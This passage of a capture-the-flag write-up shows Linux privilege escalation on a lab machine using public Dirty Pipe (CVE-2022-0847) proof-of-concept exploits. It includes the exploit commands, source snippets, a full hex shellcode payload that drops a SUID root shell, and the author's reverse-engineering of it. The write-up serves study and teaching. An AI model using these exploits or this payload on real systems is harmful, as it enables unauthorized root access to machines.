The exploit takes advantage of how the system will cache data before it is written to disk, modifying the data in that cache so that the changes get written to disk. This allows for an attacker to modify files even without write permissions with some constraints:
- They must have read access to the file.
- They can’t modify the first byte of the file.
- They can’t change the size of the file.

Within these constraints, the most common way to exploit this is to modify the `/etc/passwd` file (something I’ve shown [many times before](/tags.html#passwd)). The difference is that typically I’ve added a second root user with a known hash. In this case, the exploit will typically just make a backup copy of the file, edit in place the root user, get a shell as that user, and then put the original file back.

The other less common way to exploit this is to overwrite a SUID binary with a new ELF that gets a shell.

There are some other ways of abusing arbitrary write that don’t really work in this case. I could write to `/etc/crontab` (or other `cron` files), but because of how the attack works, the file system won’t notify `cron` to reload them. If the changes last through a reboot or other `cron` modification, they could work. Another common technique with arbitrary write is to change the `sudoers` file, allowing the current user to run commands as root. That won’t work here because typically that file can’t be read by a non-root user.

### Exploit /etc/passwd

#### Success, but Failure

[This repo](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits) has two Dirty Pipe proof of concept exploits. The first does what most Dirty Pipe exploits do, modifying `/etc/password`. `gcc` and `cc` aren’t on Altered, so I’ll just download the source and compile it on my own workstation:

```

oxdf@hacky$ wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c
...[snip]...
oxdf@hacky$ gcc -o exploit-1 exploit-1.c

```

I’ll run a Python webserver in that directory, and fetch the exploit from Altered:

```

www-data@altered:/dev/shm$ wget 10.10.14.6/exploit-1
...[snip]...
www-data@altered:/dev/shm$ chmod +x exploit-1

```

On running it, I get an unexpected result:

```

www-data@altered:/dev/shm$ ./exploit-1 
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
--- Welcome to PAM-Wordle! ---

A five character [a-z] word has been selected.
You have 6 attempts to guess the word.

After each guess you will receive a hint which indicates:
? - what letters are wrong.
* - what letters are in the wrong spot.
[a-z] - what letters are correct.
--- Attempt 1 of 6 ---
Word: Invalid guess: unknown word.
Word:

```

The exploit changed the password to “piped”, and then is trying to run `su`:

```

	char *argv[] = {"/bin/sh", "-c", "(echo piped; cat) | su - -c \""
                "echo \\\"Restoring /etc/passwd from /tmp/passwd.bak...\\\";"
                "cp /tmp/passwd.bak /etc/passwd;"
                "echo \\\"Done! Popping shell... (run commands now)\\\";"
                "/bin/sh;"
            "\" root"};
        execv("/bin/sh", argv);

```

#### PAM-Wordle

If I Ctrl-c from this and just run `su`, I see the same thing:

```

www-data@altered:/dev/shm$ su -
--- Welcome to PAM-Wordle! ---

A five character [a-z] word has been selected.
You have 6 attempts to guess the word.

After each guess you will receive a hint which indicates:
? - what letters are wrong.
* - what letters are in the wrong spot.
[a-z] - what letters are correct.
--- Attempt 1 of 6 ---
Word:

```

The only difference is that the exploit tried to send “piped” which returned that it wasn’t a word.

It seems this box has [PAM-Wordle](https://github.com/lukem1/pam-wordle) installed. PAM stands for Pluggable Authentication Module. It seems this was added in on this box. Wordle is a word game that’s very popular on the internet now (check out [my video on hacking Wordle](https://www.youtube.com/watch?v=or1AKX5kTZA)). This kind of thing isn’t very realistic, and I wouldn’t expect to see it on a Weekly HTB machine, but it’s kind of funny for a live event like UHC.

I’ll quickly find that it’s using a non-standard dictionary, as all the words I guess aren’t in it:

```
--- Attempt 1 of 6 ---
Word: stare
Invalid guess: unknown word.
Word: crane
Invalid guess: unknown word.
Word: adieu
Invalid guess: unknown word.

```

It seems broken, which is really just a suggestion to find another path. Still, it is possible. It seems like it takes hacking / computer words:

```

Word: hacks
Hint->???*?

```

That means there’s an “h” and a “s” in the word, but neither is in the right place.

After playing a few times and getting a feel for the wordlist, I was able to win:

```
--- Attempt 1 of 6 ---
Word: hacks
Hint->???*?
--- Attempt 2 of 6 ---
Word: shell
Hint->?????
--- Attempt 3 of 6 ---
Word: mkdir
Hint->?*??*
--- Attempt 4 of 6 ---
Word: ngrok 
Correct!
Password:

```

I’ll enter the password from the exploit, “piped”, and get a root shell:

```
--- Attempt 4 of 6 ---
Word: ngrok 
Correct!
Password:
# bash
root@altered:~#

```

And get `root.txt`:

```

root@altered:~# cat root.txt
0741c579************************

```

### Exploit SUID

The second POC in that repo exploits a SUID binary. I’ll download it and compile it:

```

oxdf@hacky$ wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-2.c
...[snip]...
oxdf@hacky$ gcc -o exploit-2 exploit-2.c 

```

Using the Python webserver I’ll upload it:

```

www-data@altered:/dev/shm$ wget 10.10.14.6/exploit-2
...[snip]...
www-data@altered:/dev/shm$ chmod +x exploit-2 

```

This one requires that I give it a SUID binary. `pkexec` seems like a good one:

```

www-data@altered:/dev/shm$ which pkexec
/usr/bin/pkexec
www-data@altered:/dev/shm$ ls -l /usr/bin/pkexec 
-rwsr-xr-x 1 root root 31032 Feb 21 12:58 /usr/bin/pkexec

```

Running it gives a root shell:

```

www-data@altered:/dev/shm$ ./exploit-2 /usr/bin/pkexec     
[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
#

```

It’s not clear from that what it’s doing, but I’ll look at that in [Beyond Root](#beyond-root---dirty-pipe-exploit-2).

## Beyond Root - Dirty Pipe “exploit-2”

### Source

Looking at bit more closely at the [source](https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-2.c) for `exploit-2.c`. The `main` function is starts by checking for the required arg and printing the help and exiting if it’s not there:

```

int main(int argc, char **argv) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s SUID\n", argv[0]);
        return EXIT_FAILURE;
    }

```

The arg is stored in `path`, and that file is opened, with the file descriptor stored in `fd`. Then it gets a buffer the size of `elfcode` (which I’ll show in a minute) named `orig_bytes`. It seeks one byte into the legit file, and reads the size of `elfcode` into `orig_bytes` and closes the file descriptor. This is a backup of the original file:

```

    char *path = argv[1];
    uint8_t *data = elfcode;
    int fd = open(path, O_RDONLY);
    uint8_t *orig_bytes = malloc(sizeof(elfcode));
    lseek(fd, 1, SEEK_SET);
    read(fd, orig_bytes, sizeof(elfcode));
    close(fd);

```

Next it calls `hax(path, 1, elfcode, sizeof(elfcode))`. Presumably, this writes `elfcode` into the SUID binary starting at the second byte (because the exploit can’t write the first byte).

```

    printf("[+] hijacking suid binary..\n");
    if (hax(path, 1, elfcode, sizeof(elfcode)) != 0) {
        printf("[~] failed\n");
        return EXIT_FAILURE;
    }

```

Then it runs the given binary, and then uses `hax` to write the original bytes back into the SUID binary, effectively restoring it:

```

    printf("[+] dropping suid shell..\n");
    system(path);
    printf("[+] restoring suid binary..\n");
    if (hax(path, 1, orig_bytes, sizeof(elfcode)) != 0) {
        printf("[~] failed\n");
        return EXIT_FAILURE;
    }

```

Finally, it runs `/tmp/sh`:

```

    printf("[+] popping root shell.. (dont forget to clean up /tmp/sh ;))\n");
    system("/tmp/sh");
    return EXIT_SUCCESS;
}

```

### RE elfcode

`elfcode` is in the code as a string of hex bytes:

![image-20220325100948025](https://0xdfimages.gitlab.io/img/image-20220325100948025.png)

I’ll grab the hex, drop it into `vim`, and use some quick macros to clean it up to a long hex string:

```

7f454c4602010100000000000000000002003e0001000000780040000000000040000000000000000000000000000000000000004000380001000000000000000100000005000000000000000000000000004000000000000000400000000000970100000000000097010000000000000010000000000000488d3d5600000048c7c64102000048c7c0020000000f054889c7488d354400000048c7c2ba00000048c7c0010000000f0548c7c0030000000f05488d3d1c00000048c7c6ed09000048c7c05a0000000f054831ff48c7c03c0000000f052f746d702f7368007f454c4602010100000000000000000002003e0001000000780040000000000040000000000000000000000000000000000000004000380001000000000000000100000005000000000000000000000000004000000000000000400000000000ba00000000000000ba0000000000000000100000000000004831ff48c7c0690000000f054831ff48c7c06a0000000f05488d3d1b0000006a004889e2574889e648c7c03b0000000f0548c7c03c0000000f052f62696e2f736800

```

`xxd` will decode that to a raw binary:

```

oxdf@hacky$ xxd -r -p elfcode > elf
oxdf@hacky$ file elf
elf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header

```

I’ll open that in Ghidra, and there’s only one function, `entry`. The decompile isn’t super useful:

![image-20220325101251096](https://0xdfimages.gitlab.io/img/image-20220325101251096.png)

Still, it is just five `syscall` calls. In the listing, what’s actually happening is clearer. Each `syscall` looks like this:

![image-20220325101346001](https://0xdfimages.gitlab.io/img/image-20220325101346001.png)

I can clean that up to:

```

fd = syscall(0x2, 0x241, "/tmp/sh")
syscall(0x1, fd, buffer, 0xba)
syscall(0x3, fd)
syscall(0x5a, 0x9ed, "/tmp/sh")
syscall(0x3c, 0x0)

```

Using [this handy table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit) I can convert that to the following pseudocode:

```

fd = open("/tmp/sh", flags=0x241)
write(fd, 0x4000dd, 0xba)
close(fd)
chmod("/tmp/sh", 0x9ed) // 0x9ed == 4755 in octal
exit(0)

```

The buffer at 0x4000dd is another ELF:

![image-20220325102111276](https://0xdfimages.gitlab.io/img/image-20220325102111276.png)

0x4000dd + 0xba = 0x400197, which is where this file ends:

![image-20220325102211513](https://0xdfimages.gitlab.io/img/image-20220325102211513.png)

### RE /tmp/sh

I’ll grab a copy of `/tmp/sh` from Altered, or highlight this space in Ghidra –> right click –> Copy Special –> Byte String (No Spaces), and then `xxd -r -p` it to get a binary. It’s another binary with a single function, `entry`, and this time four syscalls:

```

syscall(0x69, 0);
syscall(0x6a, 0);
syscall(0x3b, "/bin/sh", ["/bin/sh"], 0);
syscall(0x3c, 0x4000b2);

```

This simplifies to:

```

setuid(0);
setgid(0);
execve("/bin/sh", ["/bin/sh"], NULL);
exit(0x4000b2)

```

So it’s ensuring it has root user and group privs and calling `/bin/sh`.